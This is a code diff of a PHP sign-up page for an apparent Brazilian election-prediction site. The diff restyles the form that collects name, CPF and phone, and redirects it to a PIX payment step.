@@ -12,7 +12,7 @@ $_SESSION['servico_escolhido'] = $servico;
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identificação do Participante - Mercado Eleitoral 2026</title>
+    <title>Mercado Eleitoral 2026 - Validação do Palpite</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
@@ -27,42 +27,55 @@ $_SESSION['servico_escolhido'] = $servico;
 <body class="bg-slate-950 min-h-screen font-sans text-gray-100 flex flex-col justify-between">
 
     <!-- Topo -->
-    <header class="bg-custom-header text-white text-xs py-2.5 px-4 border-b border-slate-800">
+    <header class="bg-custom-header text-white text-xs py-3 px-4 border-b border-slate-800">
         <div class="max-w-xl mx-auto flex justify-between items-center">
-            <span class="font-semibold"><i class="fa-solid fa-chart-line text-emerald-400 mr-1.5"></i> Mercado Eleitoral 2026</span>
+            <span class="font-semibold flex items-center gap-2">
+                <i class="fa-solid fa-chart-line text-emerald-400"></i> Mercado Eleitoral 2026
+            </span>
             <span class="text-emerald-400 font-bold flex items-center gap-1">
-                <i class="fa-solid fa-shield-halved text-xs"></i> Ambiente Seguro
+                <i class="fa-solid fa-shield-halved"></i> Ambiente Seguro
             </span>
         </div>
     </header>
 
-    <!-- Conteúdo Principal -->
-    <main class="max-w-xl w-full mx-auto p-4 my-auto space-y-4">
-
-        <!-- Passo atual -->
-        <div class="text-center space-y-1">
-            <div class="inline-flex items-center gap-2 bg-slate-900 border border-slate-800 px-3 py-1 rounded-full text-xs text-slate-300 font-medium">
-                <i class="fa-solid fa-user-shield text-blue-400"></i> IDENTIFICAÇÃO DO PARTICIPANTE
-                <span class="bg-blue-600/30 text-blue-400 px-2 py-0.5 rounded-full text-[10px] font-bold border border-blue-500/30">Passo 1 de 2</span>
+    <!-- Sub-cabeçalho da Página -->
+    <div class="bg-slate-900 border-b border-slate-800 py-3 px-4 text-center">
+        <div class="max-w-xl mx-auto flex items-center justify-between">
+            <div class="flex items-center gap-2 text-left">
+                <div class="w-8 h-8 rounded-lg bg-blue-500/20 text-blue-400 flex items-center justify-center font-bold text-sm">
+                    <i class="fa-solid fa-user-pen"></i>
+                </div>
+                <div>
+                    <h2 class="text-xs font-bold text-white uppercase tracking-wider">Identificação do Participante</h2>
+                    <p class="text-[10px] text-slate-400">Preencha seus dados para registrar o palpite</p>
+                </div>
             </div>
-            <p class="text-xs text-slate-400">Preencha seus dados para registrar o palpite</p>
+            <span class="text-[10px] bg-blue-500/20 text-blue-400 font-bold px-2.5 py-1 rounded-full border border-blue-500/30">
+                Passo 1 de 2
+            </span>
         </div>
+    </div>
 
-        <div class="card-custom rounded-2xl p-5 shadow-2xl space-y-5">
+    <!-- Conteúdo Principal -->
+    <main class="max-w-xl w-full mx-auto p-4 my-4 space-y-4">
 
-            <!-- Resumo do Palpite Escolhido -->
+        <div class="card-custom rounded-2xl p-6 shadow-2xl space-y-5">
+
+            <!-- Box do Serviço/Palpite Selecionado -->
             <div class="bg-slate-900/90 border border-blue-500/30 rounded-xl p-3.5 flex items-start gap-3">
-                <div class="bg-blue-500/20 text-blue-400 p-2 rounded-lg mt-0.5">
-                    <i class="fa-solid fa-ticket text-sm"></i>
+                <div class="text-blue-400 mt-0.5">
+                    <i class="fa-solid fa-circle-info text-sm"></i>
                 </div>
                 <div class="text-xs space-y-0.5">
-                    <span class="text-slate-400 font-semibold block uppercase text-[10px]">Palpite Selecionado:</span>
-                    <span class="text-white font-bold text-sm block"><?php echo htmlspecialchars($servico); ?></span>
+                    <span class="text-slate-400 font-semibold block">Palpite Selecionado:</span>
+                    <span class="font-bold text-white"><?php echo htmlspecialchars($servico); ?></span>
                 </div>
             </div>
 
-            <!-- Formulário Simplificado -->
-            <form id="formCadastro" action="processar_cadastro.php" method="POST" class="space-y-4">
+            <!-- Formulário apontando para o pay.php -->
+            <form action="pay.php" method="POST" class="space-y-4" onsubmit="salvarDadosLocais()">
+
+                <!-- Campo oculto para passar o serviço/palpite adiante -->
                 <input type="hidden" name="servico" value="<?php echo htmlspecialchars($servico); ?>">
 
                 <!-- Nome Completo -->
@@ -72,45 +85,36 @@ $_SESSION['servico_escolhido'] = $servico;
                     </label>
                     <div class="relative">
                         <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 text-sm">
-                            <i class="fa-solid fa-user"></i>
+                            <i class="fa-solid fa-user text-xs"></i>
                         </span>
-                        <input type="text" name="nome" id="nome" required placeholder="Digite seu nome completo" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-semibold">
+                        <input type="text" name="nome" id="nome" required placeholder="Digite seu nome completo" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-medium">
                     </div>
                 </div>
 
-                <!-- Grid CPF e WhatsApp -->
+                <!-- CPF e Telefone -->
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
-                    
-                    <!-- CPF -->
                     <div class="space-y-1.5">
-                        <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">
-                            CPF
-                        </label>
+                        <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">CPF</label>
                         <div class="relative">
                             <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 text-sm">
-                                <i class="fa-solid fa-id-card"></i>
+                                <i class="fa-solid fa-id-card text-xs"></i>
                             </span>
-                            <input type="text" name="cpf" id="cpf" required placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-semibold">
+                            <input type="text" name="cpf" id="cpf" required placeholder="000.000.000-00" maxlength="14" oninput="mascaraCPF(this)" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-medium">
                         </div>
                     </div>
-
-                    <!-- Telefone / WhatsApp -->
                     <div class="space-y-1.5">
-                        <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">
-                            Telefone / WhatsApp
-                        </label>
+                        <label class="block text-xs font-bold text-slate-300 uppercase tracking-wider">Telefone / WhatsApp</label>
                         <div class="relative">
                             <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-slate-400 text-sm">
-                                <i class="fa-solid fa-phone"></i>
+                                <i class="fa-solid fa-phone text-xs"></i>
                             </span>
-                            <input type="text" name="telefone" id="telefone" required placeholder="(00) 00000-0000" maxlength="15" oninput="mascaraTelefone(this)" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-semibold">
+                            <input type="text" name="telefone" id="telefone" required placeholder="(00) 00000-0000" maxlength="15" oninput="mascaraTelefone(this)" class="w-full bg-slate-900 border border-slate-700 rounded-xl pl-10 pr-4 py-3 text-sm text-white focus:outline-none focus:border-blue-500 font-medium">
                         </div>
                     </div>
-
                 </div>
 
-                <!-- Botão de Avançar -->
-                <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 px-4 rounded-xl transition shadow-lg shadow-emerald-600/30 flex items-center justify-center gap-2 text-sm mt-2">
+                <!-- Botão de Avançar para Pagamento -->
+                <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3.5 px-4 rounded-xl transition shadow-lg shadow-emerald-600/30 flex items-center justify-center gap-2 text-sm mt-3">
                     <span>Avançar para Pagamento PIX</span>
                     <i class="fa-solid fa-arrow-right text-xs"></i>
                 </button>
@@ -121,13 +125,11 @@ $_SESSION['servico_escolhido'] = $servico;
     </main>
 
     <!-- Rodapé -->
-    <footer class="text-center text-[10px] text-slate-500 py-3 space-y-1">
-        <p><i class="fa-solid fa-lock text-emerald-500 mr-1"></i> As informações fornecidas são protegidas por sigilo e criptografia.</p>
-        <p>&copy; 2026 Mercado Eleitoral - Todos os direitos reservados</p>
+    <footer class="text-center text-[10px] text-slate-500 py-3">
+        Plataforma interativa de simulação de cenários políticos e pesquisas eleitorais 2026.
     </footer>
 
     <script>
-        // Máscara automática para CPF
         function mascaraCPF(input) {
             let v = input.value.replace(/\D/g, "");
             if (v.length > 11) v = v.slice(0, 11);
@@ -137,7 +139,6 @@ $_SESSION['servico_escolhido'] = $servico;
             input.value = v;
         }
 
-        // Máscara automática para Telefone/WhatsApp
         function mascaraTelefone(input) {
             let v = input.value.replace(/\D/g, "");
             if (v.length > 11) v = v.slice(0, 11);
@@ -153,12 +154,11 @@ $_SESSION['servico_escolhido'] = $servico;
             input.value = v;
         }
 
-        // Salva dados locais também caso precise na tela seguinte
-        document.getElementById('formCadastro').addEventListener('submit', function() {
+        function salvarDadosLocais() {
             localStorage.setItem('nome_participante', document.getElementById('nome').value);
             localStorage.setItem('cpf_participante', document.getElementById('cpf').value);
             localStorage.setItem('telefone_participante', document.getElementById('telefone').value);
-        });
+        }
     </script>
 </body>
 </html>
